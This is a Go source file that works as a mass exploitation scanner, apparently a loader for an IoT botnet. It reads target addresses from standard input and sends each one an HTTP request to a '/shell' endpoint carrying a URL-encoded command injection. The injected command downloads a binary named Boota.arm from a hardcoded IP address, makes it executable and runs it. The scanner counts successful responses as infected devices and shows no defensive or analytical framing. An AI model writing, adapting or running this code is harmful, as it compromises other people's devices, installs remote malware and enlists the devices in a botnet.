package main

import (
	"bufio"
	f "fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

var CONNECT_TIMEOUT time.Duration = 6
var READ_TIMEOUT time.Duration = 15
var WRITE_TIMEOUT time.Duration = 10
var syncWait sync.WaitGroup

var total, running, infected int

var payload string = "rm%20-rf%20Boota.0wget%3Bwget%20http%3A%2F%2F149.57.171.148%2FBoota.arm%20-O%20Boota.0wget%3Bchmod%20777%20Boota.0wget%3B.%2FBoota.0wget%20jaws.arm%3Brm%20-rf%20Boota.0wget%3B"

type scanner_info struct {
	username, password, ip, port, arch string
	bytebuf                            []byte
	err                                error
	resp, authed                       int
	conn                               net.Conn
}

func zeroByte(a []byte) {
	for i := range a {
		a[i] = 0
	}
}

func getStringInBetween(str string, start string, end string) (result string) {

	s := strings.Index(str, start)
	if s == -1 {
		return
	}

	s += len(start)
	e := strings.Index(str, end)

	return str[s:e]
}

func setWriteTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
}

func setReadTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))
}

func readUntil(conn net.Conn, read bool, delims ...string) ([]byte, int, error) {

	var line []byte

	if len(delims) == 0 {
		return nil, 0, nil
	}

	p := make([]string, len(delims))
	for i, s := range delims {
		if len(s) == 0 {
			return nil, 0, nil
		}
		p[i] = s
	}

	x := bufio.NewReader(conn)
	for {
		b, err := x.ReadByte()
		if err != nil {
			return nil, 0, err
		}

		if read {
			line = append(line, b)
		}

		for i, s := range p {
			if s[0] == b {
				if len(s) == 1 {
					return line, len(line), nil
				}
				p[i] = s[1:]
			} else {
				p[i] = delims[i]
			}
		}
	}

	return nil, 0, nil
}

func run_sub() {
	running--
}

func (info *scanner_info) cleanupTarget(close int, conn net.Conn) {

	if close == 1 {
		info.conn.Close()
	}

	zeroByte(info.bytebuf)
	info.username = ""
	info.password = ""
	info.arch = ""
	info.ip = ""
	info.port = ""
	info.err = nil
	info.resp = 0
	info.authed = 0
}

func processTarget(target, port string) {
	total++
	running++

	defer run_sub()

	args := strings.Split(target, ":")

	info := scanner_info{
		username: "",
		password: "",
		arch:     "",
		bytebuf:  nil,
		err:      nil,
		resp:     0,
		authed:   0,
	}

	if strings.Contains(target, ":") {
		info.ip = args[0]
		info.port = args[1]
	} else {
		info.ip = target
		info.port = port
	}

	defer info.cleanupTarget(0, info.conn)
	info.conn, info.err = net.DialTimeout("tcp", info.ip+":"+info.port, CONNECT_TIMEOUT*time.Second)
	if info.err != nil {
		syncWait.Done()
		return
	}

	defer info.cleanupTarget(1, info.conn)
	setWriteTimeout(info.conn, WRITE_TIMEOUT)
	info.conn.Write([]byte("GET /shell?" + payload + " HTTP/1.1\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nUser-Agent: KrebsOnSecurity\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n\r\n"))

	setReadTimeout(info.conn, 30)
	info.bytebuf = make([]byte, 512)
	l, err := info.conn.Read(info.bytebuf)
	if err != nil || l <= 0 {
		syncWait.Done()
		return
	}

	if strings.Contains(string(info.bytebuf), "200 OK") {
		f.Printf("%s\n", info.bytebuf)
		infected++
	}

	zeroByte(info.bytebuf)
	syncWait.Done()
	return
}

func main() {

	var i int = 0
	go func() {
		for {
			f.Printf("[%d's] Total [%d] Running [%d] Infected [%d]\r\n", i, total, running, infected)
			time.Sleep(1 * time.Second)
			i++
		}
	}()

	for {
		r := bufio.NewReader(os.Stdin)
		scan := bufio.NewScanner(r)
		for scan.Scan() {
			go processTarget(scan.Text(), os.Args[1])
			syncWait.Add(1)
		}
	}
}
